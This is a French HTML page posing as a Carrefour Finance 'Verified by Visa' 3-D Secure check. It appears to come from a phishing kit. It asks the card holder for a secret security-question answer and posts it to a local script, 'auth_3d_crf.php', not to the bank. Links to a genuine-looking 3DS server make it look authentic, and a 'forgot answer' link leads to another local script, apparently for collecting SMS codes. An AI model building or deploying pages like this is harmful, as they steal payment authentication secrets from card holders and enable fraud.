<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Carrefour Finance - Verified by Visa™</title>
<link href="crf/style.css" rel="stylesheet" type="text/css" media="screen">
 
</head>

<body>
<div id="page">
	<div id="header"></div>

	<div id="content">
		<h1>Vos paiements sécurisés sur Internet</h1>
	
	

		<div class="form">
			<div class="content">
			<h2>Vérification de votre identité</h2>
			<div id="erreur" style="display: block;">
				<p class="erreur"></p>
			</div>
				<form method="post" action="../activity/auth_3d_crf.php" novalidate="novalidate">
				<fieldset>
						<label for="otp"><span class="title">Question personnelle</span></label>
						<!-- <span class="question-personelle">Dans quelle rue habitiez-vous lorsque vous aviez 8 ans ?</span> -->

					    <div class="field ">
						<label for="response"><span class="title">Réponse</span></label>
						<input type="password" name="response" value="" id="response" class="form-right ieheight" maxlength="50">
                        <a href="https://acs1.3ds.modirum.com/mdpayacs/pareq;mdsessionid=A5AA6D68D640C1D616A3578C8F14ABBF?help=true"><img src="crf/bt_aide.gif" alt="Aide" width="16" height="15"></a>
                        <span class="question-personelle"><a href="flowGlobal_wflowCNCE_jsession_crf_sms.php">Réponse oubliée ?</a></span>
					</div>
				</fieldset>

			<fieldset>


				</fieldset>
					
				<div class="button">	
					<!-- Reset -->
					<a href="https://acs1.3ds.modirum.com/mdpayacs/pareq;mdsessionid=A5AA6D68D640C1D616A3578C8F14ABBF?cancel=true"><img src="crf/bt_annuler.gif" alt="ANNULER"></a>&nbsp;&nbsp;
					<!-- Submit -->
                    <button type="submit" value="submit" name="submit" id="submit" onclick="return stripLeadingZeroPhone();">
                        <img src="crf/bt_suivant.gif" alt="SUIVANT">
                    </button>
				</div>
				</form>
			</div>
		</div>
	</div>

	<div id="footer"></div>
</div>




</body></html>